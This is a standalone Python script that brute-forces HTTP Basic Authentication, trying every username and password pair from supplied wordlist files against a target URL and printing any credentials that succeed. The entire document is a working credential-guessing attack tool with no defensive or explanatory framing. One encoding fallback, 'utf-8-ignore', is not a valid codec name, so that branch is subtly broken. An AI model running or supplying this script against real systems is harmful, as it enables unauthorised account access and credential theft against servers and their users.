import requests

def brute_force_http_basic_auth(url, username_list, password_list):
    """Attempts to brute-force HTTP Basic Authentication."""
    for user in username_list:
        for password in password_list:
            try:
                response = requests.get(url, auth=(user, password))
                if response.status_code == 200:
                    print(f"[+] Successful credentials found - Username: {user}, Password: {password}")
                    return True
                elif response.status_code == 401:
                    print(f"[-] Authentication failed for Username: {user}, Password: {password}")
                else:
                    print(f"[-] Unexpected status code {response.status_code} for Username: {user}, Password: {password}")
            except requests.exceptions.RequestException as e:
                print(f"[-] Error during request: {e}")
                return False
    print("[-] No valid credentials found.")
    return False

if __name__ == "__main__":
    target_url = input("Enter target URL for HTTP Basic Auth: ")
    username_file = input("Enter path to username list file: ")
    password_file = input("Enter path to password list file: ")

    try:
        with open(username_file, 'r', encoding='utf-8') as f:
            usernames = [line.strip() for line in f]
    except FileNotFoundError:
        print(f"[-] Error: Username file not found at {username_file}")
        exit()
    except UnicodeDecodeError as e:
        print(f"[-] Error decoding username file with UTF-8: {e}")
        exit()

    try:
        with open(password_file, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f]
    except FileNotFoundError:
        print(f"[-] Error: Password file not found at {password_file}")
        exit() 
    except UnicodeDecodeError as e:
        print(f"[-] Error decoding password file with UTF-8: {e}")
        print("[-] Trying with 'latin-1'...")
        try:
            with open(password_file, 'r', encoding='latin-1') as f:
                passwords = [line.strip() for line in f]
        except UnicodeDecodeError as e2:
            print(f"[-] Error decoding password file with latin-1: {e2}")
            print("[-] Trying with 'utf-8-ignore'...")
            try:
                with open(password_file, 'r', encoding='utf-8-ignore') as f:
                    passwords = [line.strip() for line in f]
            except UnicodeDecodeError as e3:
                print(f"[-] Error decoding password file even with 'utf-8-ignore': {e3}")
                exit()

    brute_force_http_basic_auth(target_url, usernames, passwords)
    